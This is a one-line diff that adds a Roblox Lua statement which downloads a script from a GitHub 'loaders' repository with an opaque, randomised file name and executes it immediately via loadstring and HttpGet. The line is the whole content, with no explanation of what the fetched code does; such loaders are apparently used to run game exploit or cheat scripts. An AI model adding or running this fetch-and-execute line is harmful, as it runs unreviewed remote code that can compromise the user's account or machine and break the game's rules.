@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AssemblyLook/loaders/main/loaders/upd-something-is-wrong-with-my-dog-spam3-th91qcyqmc6mjw.lua"))()
